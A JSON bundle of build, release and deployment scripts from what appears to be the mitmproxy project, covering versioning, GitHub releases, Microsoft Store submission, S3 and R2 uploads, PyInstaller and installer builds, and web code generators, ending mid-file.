{"release/release.py": "#!/usr/bin/env -S python3 -u\nimport datetime\nimport http.client\nimport json\nimport os\nimport re\nimport subprocess\nimport sys\nimport time\nfrom pathlib import Path\n\n# Security: No third-party dependencies here!\n\nroot = Path(__file__).absolute().parent.parent\n\n\ndef get(url: str) -> http.client.HTTPResponse:\n    assert url.startswith(\"https://\")\n    host, path = re.split(r\"(?=/)\", url.removeprefix(\"https://\"), maxsplit=1)\n    conn = http.client.HTTPSConnection(host)\n    conn.request(\"GET\", path, headers={\"User-Agent\": \"mitmproxy/release-bot\"})\n    resp = conn.getresponse()\n    print(f\"HTTP {resp.status} {resp.reason}\")\n    return resp\n\n\ndef get_json(url: str) -> dict:\n    resp = get(url)\n    body = resp.read()\n    try:\n        return json.loads(body)\n    except Exception as e:\n        raise RuntimeError(f\"{resp.status=} {body=}\") from e\n\n\nif __name__ == \"__main__\":\n    version = sys.argv[1]\n    assert re.match(r\"^\\d+\\.\\d+\\.\\d+$\", version)\n    major_version = int(version.split(\".\")[0])\n\n    skip_branch_status_check = sys.argv[2] == \"true\"\n\n    # changing this is useful for testing on a fork.\n    repo = os.environ.get(\"GITHUB_REPOSITORY\", \"mitmproxy/mitmproxy\")\n    print(f\"{version=} {skip_branch_status_check=} {repo=}\")\n\n    branch = subprocess.run(\n        [\"git\", \"branch\", \"--show-current\"],\n        cwd=root,\n        check=True,\n        capture_output=True,\n        text=True,\n    ).stdout.strip()\n\n    print(\"\u27a1\ufe0f Working dir clean?\")\n    assert not subprocess.run([\"git\", \"status\", \"--porcelain\"]).stdout\n\n    if skip_branch_status_check:\n        print(f\"\u26a0\ufe0f Skipping status check for {branch}.\")\n    else:\n        print(f\"\u27a1\ufe0f CI is passing for {branch}?\")\n        assert (\n            get_json(f\"https://api.github.com/repos/{repo}/commits/{branch}/status\")[\n                \"state\"\n            ]\n            == \"success\"\n        )\n\n    print(\"\u27a1\ufe0f Updating CHANGELOG.md...\")\n    changelog = root / \"CHANGELOG.md\"\n    date = datetime.date.today().strftime(\"%d %B %Y\")\n    title = f\"## {date}: mitmproxy {version}\"\n    cl = changelog.read_text(\"utf8\")\n    assert title not in cl\n    cl, ok = re.subn(r\"(?<=## Unreleased: mitmproxy next)\", f\"\\n\\n\\n{title}\", cl)\n    assert ok == 1\n    changelog.write_text(cl, \"utf8\")\n\n    print(\"\u27a1\ufe0f Updating web assets...\")\n    subprocess.run([\"npm\", \"ci\"], cwd=root / \"web\", check=True, capture_output=True)\n    subprocess.run(\n        [\"npm\", \"start\", \"prod\"], cwd=root / \"web\", check=True, capture_output=True\n    )\n\n    print(\"\u27a1\ufe0f Updating version...\")\n    version_py = root / \"mitmproxy\" / \"version.py\"\n    ver = version_py.read_text(\"utf8\")\n    ver, ok = re.subn(r'(?<=VERSION = \")[^\"]+', version, ver)\n    assert ok == 1\n    version_py.write_text(ver, \"utf8\")\n\n    print(\"\u27a1\ufe0f Do release commit...\")\n    subprocess.run(\n        [\"git\", \"config\", \"user.email\", \"noreply@mitmproxy.org\"], cwd=root, check=True\n    )\n    subprocess.run(\n        [\"git\", \"config\", \"user.name\", \"mitmproxy release bot\"], cwd=root, check=True\n    )\n    subprocess.run(\n        [\"git\", \"commit\", \"-a\", \"-m\", f\"mitmproxy {version}\"], cwd=root, check=True\n    )\n    tag_name = f\"v{version}\"\n    subprocess.run([\"git\", \"tag\", tag_name], cwd=root, check=True)\n    release_sha = subprocess.run(\n        [\"git\", \"rev-parse\", \"HEAD\"],\n        cwd=root,\n        check=True,\n        capture_output=True,\n        text=True,\n    ).stdout.strip()\n\n    if branch == \"main\":\n        print(\"\u27a1\ufe0f Bump version...\")\n        next_dev_version = f\"{major_version + 1}.0.0.dev\"\n        ver, ok = re.subn(r'(?<=VERSION = \")[^\"]+', next_dev_version, ver)\n        assert ok == 1\n        version_py.write_text(ver, \"utf8\")\n\n        print(\"\u27a1\ufe0f Reopen main for development...\")\n        subprocess.run(\n            [\"git\", \"commit\", \"-a\", \"-m\", f\"reopen main for development\"],\n            cwd=root,\n            check=True,\n        )\n\n    print(\"\u27a1\ufe0f Pushing...\")\n    subprocess.run(\n        [\"git\", \"push\", \"--atomic\", \"origin\", branch, tag_name], cwd=root, check=True\n    )\n\n    print(\"\u27a1\ufe0f Creating release on GitHub...\")\n    subprocess.run(\n        [\n            \"gh\",\n            \"release\",\n            \"create\",\n            tag_name,\n            \"--title\",\n            f\"mitmproxy {version}\",\n            \"--notes-file\",\n            \"release/github-release-notes.txt\",\n        ],\n        cwd=root,\n        check=True,\n    )\n\n    print(\"\u27a1\ufe0f Dispatching release workflow...\")\n    subprocess.run(\n        [\"gh\", \"workflow\", \"run\", \"main.yml\", \"--ref\", tag_name], cwd=root, check=True\n    )\n\n    print(\"\")\n    print(\"\u2705 CI is running now.\")\n\n    while True:\n        print(\"\u231b Waiting for CI...\")\n        workflows = get_json(\n            f\"https://api.github.com/repos/{repo}/actions/runs?head_sha={release_sha}\"\n        )[\"workflow_runs\"]\n\n        all_done = True\n        if not workflows:\n            all_done = False  # we expect to have at least one workflow.\n        for workflow in workflows:\n            if workflow[\"status\"] != \"completed\":\n                all_done = False\n            if workflow[\"status\"] == \"waiting\":\n                print(f\"\u26a0\ufe0f CI is waiting for approval: {workflow['html_url']}\")\n\n        if all_done:\n            for workflow in workflows:\n                if workflow[\"conclusion\"] != \"success\":\n                    print(f\"\u26a0\ufe0f {workflow['display_title']} workflow run failed.\")\n            break\n        else:\n            time.sleep(30)  # relatively strict rate limits here.\n\n    print(\"\u27a1\ufe0f Checking GitHub Releases...\")\n    resp = get(f\"https://api.github.com/repos/{repo}/releases/tags/{version}\")\n    assert resp.status == 200\n\n    print(\"\u27a1\ufe0f Checking PyPI...\")\n    pypi_data = get_json(\"https://pypi.org/pypi/mitmproxy/json\")\n    assert version in pypi_data[\"releases\"]\n\n    print(\"\u27a1\ufe0f Checking docs archive...\")\n    resp = get(f\"https://docs.mitmproxy.org/archive/v{major_version}/\")\n    assert resp.status == 200\n\n    print(f\"\u27a1\ufe0f Checking Docker ({version} tag)...\")\n    resp = get(\n        f\"https://hub.docker.com/v2/repositories/mitmproxy/mitmproxy/tags/{version}\"\n    )\n    assert resp.status == 200\n\n    if branch == \"main\":\n        print(\"\u27a1\ufe0f Checking Docker (latest tag)...\")\n        docker_latest_data = get_json(\n            \"https://hub.docker.com/v2/repositories/mitmproxy/mitmproxy/tags/latest\"\n        )\n        docker_last_updated = datetime.datetime.fromisoformat(\n            docker_latest_data[\"last_updated\"].replace(\"Z\", \"+00:00\")\n        )\n        print(f\"Last update: {docker_last_updated.isoformat(timespec='minutes')}\")\n        assert docker_last_updated > datetime.datetime.now(\n            datetime.timezone.utc\n        ) - datetime.timedelta(hours=2)\n\n    print(\"\")\n    print(\"\u2705 All done. \ud83e\udd73\")\n    print(\"\")\n", "release/deploy-microsoft-store.py": "#!/usr/bin/env python3\n\"\"\"\nThis script submits a single MSIX installer to the Microsoft Store.\n\nThe client_secret will expire after 24 months and needs to be recreated (see docstring below).\n\nReferences:\n    - https://docs.microsoft.com/en-us/windows/uwp/monetize/manage-app-submissions\n    - https://docs.microsoft.com/en-us/windows/uwp/monetize/python-code-examples-for-the-windows-store-submission-api\n    - https://docs.microsoft.com/en-us/windows/uwp/monetize/python-code-examples-for-submissions-game-options-and-trailers\n\"\"\"\n\nimport http.client\nimport json\nimport os\nimport sys\nimport tempfile\nimport urllib.parse\nfrom zipfile import ZipFile\n\n# Security: No third-party dependencies here!\n\nassert (\n    os.environ[\"GITHUB_REF\"].startswith(\"refs/tags/\")\n    or os.environ[\"GITHUB_REF\"] == \"refs/heads/citest\"\n)\n\napp_id = os.environ[\"MSFT_APP_ID\"]\n\"\"\"\nThe public application ID / product ID of the app.\nFor https://www.microsoft.com/store/productId/9NWNDLQMNZD7, the app id is 9NWNDLQMNZD7.\n\"\"\"\napp_flight = os.environ.get(\"MSFT_APP_FLIGHT\", \"\")\n\"\"\"\nThe application flight we want to target. This is useful to deploy ci test builds to a subset of users.\n\"\"\"\ntenant_id = os.environ[\"MSFT_TENANT_ID\"]\n\"\"\"\nThe tenant ID for the Azure AD application.\nhttps://partner.microsoft.com/en-us/dashboard/account/v3/usermanagement\n\"\"\"\nclient_id = os.environ[\"MSFT_CLIENT_ID\"]\n\"\"\"\nThe client ID for the Azure AD application.\nhttps://partner.microsoft.com/en-us/dashboard/account/v3/usermanagement\n\"\"\"\nclient_secret = os.environ[\"MSFT_CLIENT_SECRET\"]\n\"\"\"\nThe client secret. Expires every 24 months and needs to be recreated at\nhttps://partner.microsoft.com/en-us/dashboard/account/v3/usermanagement\nor at https://portal.azure.com/ -> App registrations -> Certificates & Secrets -> Client secrets.\n\"\"\"\n\n\ntry:\n    _, msi_file = sys.argv\nexcept ValueError:\n    print(f\"Usage: {sys.argv[0]} installer.msix\")\n    sys.exit(1)\n\nif app_flight:\n    app_id = f\"{app_id}/flights/{app_flight}\"\n    pending_submission = \"pendingFlightSubmission\"\n    packages = \"flightPackages\"\nelse:\n    pending_submission = \"pendingApplicationSubmission\"\n    packages = \"applicationPackages\"\n\nprint(\"Obtaining auth token...\")\nauth = http.client.HTTPSConnection(\"login.microsoftonline.com\")\nauth.request(\n    \"POST\",\n    f\"/{tenant_id}/oauth2/token\",\n    body=urllib.parse.urlencode(\n        {\n            \"grant_type\": \"client_credentials\",\n            \"client_id\": client_id,\n            \"client_secret\": client_secret,\n            \"resource\": \"https://manage.devcenter.microsoft.com\",\n        }\n    ),\n    headers={\"Content-Type\": \"application/x-www-form-urlencoded; charset=utf-8\"},\n)\ntoken = json.loads(auth.getresponse().read())[\"access_token\"]\nauth.close()\nheaders = {\n    \"Authorization\": f\"Bearer {token}\",\n    \"Content-type\": \"application/json\",\n    \"User-Agent\": \"Python/mitmproxy\",\n}\n\n\ndef request(method: str, path: str, body: str = \"\") -> bytes:\n    print(f\"{method} {path}\")\n    conn.request(method, path, body, headers=headers)\n    resp = conn.getresponse()\n    data = resp.read()\n    print(f\"{resp.status} {resp.reason}\")\n    # noinspection PyUnreachableCode\n    if False:\n        assert \"CI\" not in os.environ\n        # This contains sensitive data such as the fileUploadUrl, so don't print it in production.\n        print(data.decode(errors=\"ignore\"))\n    assert 200 <= resp.status < 300\n    return data\n\n\nprint(\"Getting app info...\")\nconn = http.client.HTTPSConnection(\"manage.devcenter.microsoft.com\")\n# print(request(\"GET\", f\"/v1.0/my/applications/{app_id}/listflights\"))\napp_info = json.loads(request(\"GET\", f\"/v1.0/my/applications/{app_id}\"))\n\nif pending_submission in app_info:\n    print(\"Deleting pending submission...\")\n    request(\n        \"DELETE\",\n        f\"/v1.0/my/applications/{app_id}/submissions/{app_info[pending_submission]['id']}\",\n    )\n\nprint(\"Creating new submission...\")\nsubmission = json.loads(request(\"POST\", f\"/v1.0/my/applications/{app_id}/submissions\"))\n\nprint(\"Updating submission...\")\n# Mark all existing packages for deletion.\nfor package in submission[packages]:\n    package[\"fileStatus\"] = \"PendingDelete\"\nsubmission[packages].append(\n    {\n        \"fileName\": f\"installer.msix\",\n        \"fileStatus\": \"PendingUpload\",\n        \"minimumDirectXVersion\": \"None\",\n        \"minimumSystemRam\": \"None\",\n    }\n)\nrequest(\n    \"PUT\",\n    f\"/v1.0/my/applications/{app_id}/submissions/{submission['id']}\",\n    json.dumps(submission),\n)\nconn.close()\n\nprint(f\"Zipping {msi_file}...\")\nwith tempfile.TemporaryFile() as zipfile:\n    with ZipFile(zipfile, \"w\") as f:\n        f.write(msi_file, f\"installer.msix\")\n    zip_size = zipfile.tell()\n    zipfile.seek(0)\n\n    print(\"Uploading zip file...\")\n    host, _, path = submission[\"fileUploadUrl\"].removeprefix(\"https://\").partition(\"/\")\n    upload = http.client.HTTPSConnection(host)\n    upload.request(\n        \"PUT\",\n        \"/\" + path,\n        zipfile,\n        {\n            \"x-ms-blob-type\": \"BlockBlob\",\n            \"x-ms-version\": \"2019-12-12\",\n            \"Content-Length\": str(zip_size),\n        },\n    )\nresp = upload.getresponse()\nresp.read()\nprint(resp.status, resp.reason)\nassert 200 <= resp.status < 300\nupload.close()\n\nprint(\"Publishing submission...\")\n# previous connection has timed out during upload.\nconn = http.client.HTTPSConnection(\"manage.devcenter.microsoft.com\")\nrequest(\"POST\", f\"/v1.0/my/applications/{app_id}/submissions/{submission['id']}/commit\")\n# We could wait until it's published here, but CI is billed by the minute.\n# resp = request(\"GET\", f\"/v1.0/my/applications/{app_id}/submissions/{submission['id']}/status\")\nconn.close()\n", "release/deploy.py": "#!/usr/bin/env python3\nimport os\nimport subprocess\nfrom pathlib import Path\n\n# Security: No third-party dependencies here!\n\nroot = Path(__file__).absolute().parent.parent\n\nif __name__ == \"__main__\":\n    ref = os.environ[\"GITHUB_REF\"]\n    branch: str | None = None\n    tag: str | None = None\n    if ref.startswith(\"refs/heads/\"):\n        branch = ref.replace(\"refs/heads/\", \"\")\n    elif ref.startswith(\"refs/tags/\"):\n        if not ref.startswith(\"refs/tags/v\"):\n            raise AssertionError(f\"Unexpected tag: {ref}\")\n        tag = ref.replace(\"refs/tags/v\", \"\")\n    else:\n        raise AssertionError\n\n    # Upload binaries (be it release or snapshot)\n    if tag:\n        upload_dir = tag\n    else:\n        upload_dir = f\"branches/{branch}\"\n    # Ideally we could have R2 pull from S3 automatically, but that's not possible yet. So we upload to both.\n    print(f\"Uploading binaries to snapshots.mitmproxy.org/{upload_dir}...\")\n    subprocess.check_call(\n        [\n            \"aws\",\n            \"s3\",\n            \"sync\",\n            \"--delete\",\n            *(\"--acl\", \"public-read\"),\n            *(\"--exclude\", \"*.msix\"),\n            root / \"release/dist\",\n            f\"s3://snapshots.mitmproxy.org/{upload_dir}\",\n        ]\n    )\n    if tag:\n        # We can't scope R2 tokens, so they are only exposed in the deploy env.\n        print(f\"Uploading binaries to downloads.mitmproxy.org/{upload_dir}...\")\n        subprocess.check_call(\n            [\n                \"aws\",\n                \"s3\",\n                \"sync\",\n                \"--delete\",\n                *(\"--acl\", \"public-read\"),\n                *(\"--exclude\", \"*.msix\"),\n                *(\n                    \"--endpoint-url\",\n                    f\"https://{os.environ['R2_ACCOUNT_ID']}.r2.cloudflarestorage.com\",\n                ),\n                root / \"release/dist\",\n                f\"s3://downloads/{upload_dir}\",\n            ],\n            env={\n                **os.environ,\n                \"AWS_REGION\": \"auto\",\n                \"AWS_ACCESS_KEY_ID\": os.environ[\"R2_ACCESS_KEY_ID\"],\n                \"AWS_SECRET_ACCESS_KEY\": os.environ[\"R2_SECRET_ACCESS_KEY\"],\n            },\n        )\n\n    # Upload releases to PyPI\n    if tag:\n        print(f\"Uploading wheel to PyPI...\")\n        (whl,) = root.glob(\"release/dist/mitmproxy-*-py3-none-any.whl\")\n        subprocess.check_call([\"twine\", \"upload\", whl])\n\n    # Upload docs\n    def upload_docs(path: str, src: Path = root / \"docs/public\"):\n        subprocess.check_call([\"aws\", \"configure\", \"set\", \"preview.cloudfront\", \"true\"])\n        subprocess.check_call(\n            [\n                \"aws\",\n                \"s3\",\n                \"sync\",\n                \"--delete\",\n                \"--acl\",\n                \"public-read\",\n                src,\n                f\"s3://docs.mitmproxy.org{path}\",\n            ]\n        )\n        subprocess.check_call(\n            [\n                \"aws\",\n                \"cloudfront\",\n                \"create-invalidation\",\n                \"--distribution-id\",\n                \"E1TH3USJHFQZ5Q\",\n                \"--paths\",\n                f\"{path}/*\",\n            ]\n        )\n\n    if branch == \"main\":\n        print(f\"Uploading dev docs...\")\n        upload_docs(\"/dev\")\n    if tag:\n        print(f\"Uploading release docs...\")\n        upload_docs(\"/stable\")\n        upload_docs(f\"/archive/v{tag.split('.')[0]}\", src=root / \"docs/archive\")\n", "release/build.py": "#!/usr/bin/env python3\nfrom __future__ import annotations\n\nimport hashlib\nimport os\nimport platform\nimport re\nimport shutil\nimport subprocess\nimport tarfile\nimport urllib.request\nimport warnings\nimport zipfile\nfrom datetime import datetime\nfrom pathlib import Path\n\nimport click\nimport cryptography.fernet\n\nhere = Path(__file__).absolute().parent\n\nTEMP_DIR = here / \"build\"\nDIST_DIR = here / \"dist\"\n\n\n@click.group(chain=True)\n@click.option(\"--dirty\", is_flag=True)\ndef cli(dirty):\n    if dirty:\n        print(\"Keeping temporary files.\")\n    else:\n        print(\"Cleaning up temporary files...\")\n        if TEMP_DIR.exists():\n            shutil.rmtree(TEMP_DIR)\n        if DIST_DIR.exists():\n            shutil.rmtree(DIST_DIR)\n\n        TEMP_DIR.mkdir()\n        DIST_DIR.mkdir()\n\n\n@cli.command()\ndef wheel():\n    \"\"\"Build the wheel for PyPI.\"\"\"\n    print(\"Building wheel...\")\n    subprocess.check_call(\n        [\n            \"python\",\n            \"-m\",\n            \"build\",\n            \"--outdir\",\n            DIST_DIR,\n        ]\n    )\n    if os.environ.get(\"GITHUB_REF\", \"\").startswith(\"refs/tags/\"):\n        ver = version()  # assert for tags that the version matches the tag.\n    else:\n        ver = \"*\"\n    (whl,) = DIST_DIR.glob(f\"mitmproxy-{ver}-py3-none-any.whl\")\n    print(f\"Found wheel package: {whl}\")\n    subprocess.check_call([\"tox\", \"-e\", \"wheeltest\", \"--\", whl])\n\n\nclass ZipFile2(zipfile.ZipFile):\n    # ZipFile and tarfile have slightly different APIs. Let's fix that.\n    def add(self, name: str, arcname: str) -> None:\n        return self.write(name, arcname)\n\n    def __enter__(self) -> ZipFile2:\n        return self\n\n    @property\n    def name(self) -> str:\n        assert self.filename\n        return self.filename\n\n\ndef archive(path: Path) -> tarfile.TarFile | ZipFile2:\n    if platform.system() == \"Windows\":\n        return ZipFile2(path.with_name(f\"{path.name}.zip\"), \"w\")\n    else:\n        return tarfile.open(path.with_name(f\"{path.name}.tar.gz\"), \"w:gz\")\n\n\ndef version() -> str:\n    if ref := os.environ.get(\"GITHUB_REF\", \"\"):\n        if ref.startswith(\"refs/tags/\") and not ref.startswith(\"refs/tags/v\"):\n            raise AssertionError(f\"Unexpected tag: {ref}\")\n        return (\n            ref.removeprefix(\"refs/heads/\")\n            .removeprefix(\"refs/pull/\")\n            .removeprefix(\"refs/tags/v\")\n            .replace(\"/\", \"-\")\n        )\n    else:\n        return os.environ.get(\"BUILD_VERSION\", \"dev\")\n\n\ndef operating_system() -> str:\n    match platform.system():\n        case \"Windows\":\n            system = \"windows\"\n        case \"Linux\":\n            system = \"linux\"\n        case \"Darwin\":\n            system = \"macos\"\n        case other:\n            warnings.warn(\"Unexpected system.\")\n            system = other\n    match platform.machine():\n        case \"AMD64\" | \"x86_64\":\n            machine = \"x86_64\"\n        case \"arm64\":\n            machine = \"arm64\"\n        case other:\n            warnings.warn(\"Unexpected platform.\")\n            machine = other\n    return f\"{system}-{machine}\"\n\n\ndef _pyinstaller(specfile: str) -> None:\n    print(f\"Invoking PyInstaller with {specfile}...\")\n    subprocess.check_call(\n        [\n            \"pyinstaller\",\n            \"--clean\",\n            \"--workpath\",\n            TEMP_DIR / \"pyinstaller/temp\",\n            \"--distpath\",\n            TEMP_DIR / \"pyinstaller/out\",\n            specfile,\n        ],\n        cwd=here / \"specs\",\n    )\n\n\n@cli.command()\ndef standalone_binaries():\n    \"\"\"Windows and Linux: Build the standalone binaries generated with PyInstaller\"\"\"\n    with archive(DIST_DIR / f\"mitmproxy-{version()}-{operating_system()}\") as f:\n        _pyinstaller(\"standalone.spec\")\n\n        _test_binaries(TEMP_DIR / \"pyinstaller/out\")\n\n        for tool in [\"mitmproxy\", \"mitmdump\", \"mitmweb\"]:\n            executable = TEMP_DIR / \"pyinstaller/out\" / tool\n            if platform.system() == \"Windows\":\n                executable = executable.with_suffix(\".exe\")\n\n            f.add(str(executable), str(executable.name))\n    print(f\"Packed {f.name!r}.\")\n\n\n@cli.command()\n@click.option(\"--keychain\")\n@click.option(\"--team-id\")\n@click.option(\"--apple-id\")\n@click.option(\"--password\")\ndef macos_app(\n    keychain: str | None,\n    team_id: str | None,\n    apple_id: str | None,\n    password: str | None,\n) -> None:\n    \"\"\"\n    macOS: Build into mitmproxy.app.\n\n    If you do not specify options, notarization is skipped.\n    \"\"\"\n\n    _pyinstaller(\"onedir.spec\")\n    _test_binaries(TEMP_DIR / \"pyinstaller/out/mitmproxy.app/Contents/MacOS\")\n\n    if keychain:\n        assert isinstance(team_id, str)\n        assert isinstance(apple_id, str)\n        assert isinstance(password, str)\n        # Notarize the app bundle.\n        subprocess.check_call(\n            [\n                \"xcrun\",\n                \"notarytool\",\n                \"store-credentials\",\n                \"AC_PASSWORD\",\n                *([\"--keychain\", keychain]),\n                *([\"--team-id\", team_id]),\n                *([\"--apple-id\", apple_id]),\n                *([\"--password\", password]),\n            ]\n        )\n        subprocess.check_call(\n            [\n                \"ditto\",\n                \"-c\",\n                \"-k\",\n                \"--keepParent\",\n                TEMP_DIR / \"pyinstaller/out/mitmproxy.app\",\n                TEMP_DIR / \"notarize.zip\",\n            ]\n        )\n        subprocess.check_call(\n            [\n                \"xcrun\",\n                \"notarytool\",\n                \"submit\",\n                TEMP_DIR / \"notarize.zip\",\n                *([\"--keychain\", keychain]),\n                *([\"--keychain-profile\", \"AC_PASSWORD\"]),\n                \"--wait\",\n            ]\n        )\n        # 2023: it's not possible to staple to unix executables.\n        # subprocess.check_call([\n        #     \"xcrun\",\n        #     \"stapler\",\n        #     \"staple\",\n        #     TEMP_DIR / \"pyinstaller/out/mitmproxy.app\",\n        # ])\n    else:\n        warnings.warn(\"Notarization skipped.\")\n\n    with archive(DIST_DIR / f\"mitmproxy-{version()}-{operating_system()}\") as f:\n        f.add(str(TEMP_DIR / \"pyinstaller/out/mitmproxy.app\"), \"mitmproxy.app\")\n    print(f\"Packed {f.name!r}.\")\n\n\ndef _ensure_pyinstaller_onedir():\n    if not (TEMP_DIR / \"pyinstaller/out/onedir\").exists():\n        _pyinstaller(\"onedir.spec\")\n        _test_binaries(TEMP_DIR / \"pyinstaller/out/onedir\")\n\n\ndef _test_binaries(binary_directory: Path) -> None:\n    for tool in [\"mitmproxy\", \"mitmdump\", \"mitmweb\"]:\n        executable = binary_directory / tool\n        if platform.system() == \"Windows\":\n            executable = executable.with_suffix(\".exe\")\n\n        print(f\"> {tool} --version\")\n        subprocess.check_call([executable, \"--version\"])\n\n        if tool == \"mitmproxy\":\n            continue  # requires a TTY, which we don't have here.\n\n        print(f\"> {tool} -s selftest.py\")\n        subprocess.check_call([executable, \"-s\", here / \"selftest.py\"])\n\n\n@cli.command()\ndef msix_installer():\n    \"\"\"Windows: Build the MSIX installer for the Windows Store.\"\"\"\n    _ensure_pyinstaller_onedir()\n\n    shutil.copytree(\n        TEMP_DIR / \"pyinstaller/out/onedir\",\n        TEMP_DIR / \"msix\",\n        dirs_exist_ok=True,\n    )\n    shutil.copytree(here / \"windows-installer\", TEMP_DIR / \"msix\", dirs_exist_ok=True)\n\n    manifest = TEMP_DIR / \"msix/AppxManifest.xml\"\n    app_version = version()\n    if not re.match(r\"\\d+\\.\\d+\\.\\d+\", app_version):\n        app_version = (\n            datetime.now()\n            .strftime(\"%y%m.%d.%H%M\")\n            .replace(\".0\", \".\")\n            .replace(\".0\", \".\")\n            .replace(\".0\", \".\")\n        )\n    manifest.write_text(manifest.read_text().replace(\"1.2.3\", app_version))\n\n    makeappx_exe = (\n        Path(os.environ[\"ProgramFiles(x86)\"])\n        / \"Windows Kits/10/App Certification Kit/makeappx.exe\"\n    )\n    subprocess.check_call(\n        [\n            makeappx_exe,\n            \"pack\",\n            \"/d\",\n            TEMP_DIR / \"msix\",\n            \"/p\",\n            DIST_DIR / f\"mitmproxy-{version()}-installer.msix\",\n        ],\n    )\n    assert (DIST_DIR / f\"mitmproxy-{version()}-installer.msix\").exists()\n\n\n@cli.command()\ndef installbuilder_installer():\n    \"\"\"Windows: Build the InstallBuilder installer.\"\"\"\n    _ensure_pyinstaller_onedir()\n\n    IB_VERSION = \"23.4.0\"\n    IB_SETUP_SHA256 = \"e4ff212ed962f9e0030d918b8a6e4d6dd8a9adc8bf8bc1833459351ee649eff3\"\n    IB_DIR = here / \"installbuilder\"\n    IB_SETUP = IB_DIR / \"setup\" / f\"{IB_VERSION}-installer.exe\"\n    IB_CLI = Path(\n        rf\"C:\\Program Files\\InstallBuilder Enterprise {IB_VERSION}\\bin\\builder-cli.exe\"\n    )\n    IB_LICENSE = IB_DIR / \"license.xml\"\n\n    if not IB_LICENSE.exists():\n        print(\"Decrypt InstallBuilder license...\")\n        f = cryptography.fernet.Fernet(os.environ[\"CI_BUILD_KEY\"].encode())\n        with (\n            open(IB_LICENSE.with_suffix(\".xml.enc\"), \"rb\") as infile,\n            open(IB_LICENSE, \"wb\") as outfile,\n        ):\n            outfile.write(f.decrypt(infile.read()))\n\n    if not IB_CLI.exists():\n        if not IB_SETUP.exists():\n            url = (\n                f\"https://github.com/mitmproxy/installbuilder-mirror/releases/download/\"\n                f\"{IB_VERSION}/installbuilder-enterprise-{IB_VERSION}-windows-x64-installer.exe\"\n            )\n            print(f\"Downloading InstallBuilder from {url}...\")\n\n            def report(block, blocksize, total):\n                done = block * blocksize\n                if round(100 * done / total) != round(100 * (done - blocksize) / total):\n                    print(f\"Downloading... {round(100 * done / total)}%\")\n\n            tmp = IB_SETUP.with_suffix(\".tmp\")\n            urllib.request.urlretrieve(\n                url,\n                tmp,\n                reporthook=report,\n            )\n            tmp.rename(IB_SETUP)\n\n        ib_setup_hash = hashlib.sha256()\n        with IB_SETUP.open(\"rb\") as fp:\n            while True:\n                data = fp.read(65_536)\n                if not data:\n                    break\n                ib_setup_hash.update(data)\n        if ib_setup_hash.hexdigest() != IB_SETUP_SHA256:  # pragma: no cover\n            raise RuntimeError(\n                f\"InstallBuilder hashes don't match: {ib_setup_hash.hexdigest()}\"\n            )\n\n        print(\"Install InstallBuilder...\")\n        subprocess.run(\n            [IB_SETUP, \"--mode\", \"unattended\", \"--unattendedmodeui\", \"none\"], check=True\n        )\n        assert IB_CLI.is_file()\n\n    print(\"Run InstallBuilder...\")\n    subprocess.check_call(\n        [\n            IB_CLI,\n            \"build\",\n            str(IB_DIR / \"mitmproxy.xml\"),\n            \"windows-x64\",\n            \"--license\",\n            str(IB_LICENSE),\n            \"--setvars\",\n            f\"project.version={version()}\",\n            \"--verbose\",\n        ],\n        cwd=IB_DIR,\n    )\n    installer = DIST_DIR / f\"mitmproxy-{version()}-windows-x64-installer.exe\"\n    assert installer.exists()\n\n    # unify filenames\n    installer = installer.rename(\n        installer.with_name(installer.name.replace(\"x64\", \"x86_64\"))\n    )\n\n    print(\"Run installer...\")\n    subprocess.run(\n        [installer, \"--mode\", \"unattended\", \"--unattendedmodeui\", \"none\"], check=True\n    )\n    _test_binaries(Path(r\"C:\\Program Files\\mitmproxy\\bin\"))\n\n\nif __name__ == \"__main__\":\n    cli()\n", "web/gen/options_js.py": "#!/usr/bin/env python3\n\nimport asyncio\nimport io\nimport json\nfrom collections.abc import Sequence\nfrom contextlib import redirect_stdout\nfrom pathlib import Path\n\nfrom mitmproxy import options\nfrom mitmproxy import optmanager\nfrom mitmproxy.tools.web import master\n\nhere = Path(__file__).parent.absolute()\n\nfilename = here / \"../src/js/ducks/_options_gen.ts\"\n\n\ndef _ts_type(t):\n    if t == bool:\n        return \"boolean\"\n    if t == str:\n        return \"string\"\n    if t == int:\n        return \"number\"\n    if t == Sequence[str]:\n        return \"string[]\"\n    if t == str | None:\n        return \"string | undefined\"\n    if t == int | None:\n        return \"number | undefined\"\n    raise RuntimeError(t)\n\n\nasync def make() -> str:\n    o = options.Options()\n    m = master.WebMaster(o)\n    opt: optmanager._Option\n\n    with redirect_stdout(io.StringIO()) as s:\n        print(\"/** Auto-generated by web/gen/options_js.py */\")\n\n        print(\"export interface OptionsState {\")\n        for _, opt in sorted(m.options.items()):\n            print(f\"    {opt.name}: {_ts_type(opt.typespec)};\")\n        print(\"}\")\n        print(\"\")\n        print(\"export type Option = keyof OptionsState;\")\n        print(\"\")\n        print(\"export const defaultState: OptionsState = {\")\n        for _, opt in sorted(m.options.items()):\n            print(\n                f\"    {opt.name}: {json.dumps(opt.default)},\".replace(\n                    \": null\", \": undefined\"\n                )\n            )\n        print(\"};\")\n\n    await m.done()\n    return s.getvalue()\n\n\nif __name__ == \"__main__\":\n    filename.write_bytes(asyncio.run(make()).encode())\n", "web/gen/tflow_js.py": "#!/usr/bin/env python3\n\nimport asyncio\nimport json\nimport textwrap\nfrom pathlib import Path\n\nfrom mitmproxy import certs\nfrom mitmproxy.http import Headers\nfrom mitmproxy.test import tflow\nfrom mitmproxy.tools.web import app\n\nhere = Path(__file__).parent.absolute()\n\nfilename = here / \"../src/js/__tests__/ducks/_tflow.ts\"\n\n\nasync def make() -> str:\n    tf_http = tflow.tflow(resp=True, err=True, ws=True)\n    tf_http.id = \"d91165be-ca1f-4612-88a9-c0f8696f3e29\"\n    tf_http.client_conn.id = \"4a18d1a0-50a1-48dd-9aa6-d45d74282939\"\n    tf_http.server_conn.id = \"f087e7b2-6d0a-41a8-a8f0-e1a4761395f8\"\n    tf_http.server_conn.certificate_list = [\n        certs.Cert.from_pem(\n            (\n                here / \"../../test/mitmproxy/net/data/verificationcerts/self-signed.pem\"\n            ).read_bytes()\n        )\n    ]\n    tf_http.request.trailers = Headers(trailer=\"qvalue\")\n    tf_http.response.trailers = Headers(trailer=\"qvalue\")\n    tf_http.comment = \"I'm a comment!\"\n\n    tf_tcp = tflow.ttcpflow(err=True)\n    tf_tcp.id = \"2ea7012b-21b5-4f8f-98cd-d49819954001\"\n    tf_tcp.client_conn.id = \"8be32b99-a0b3-446e-93bc-b29982fe1322\"\n    tf_tcp.server_conn.id = \"e33bb2cd-c07e-4214-9a8e-3a8f85f25200\"\n\n    tf_udp = tflow.tudpflow(err=True)\n    tf_udp.id = 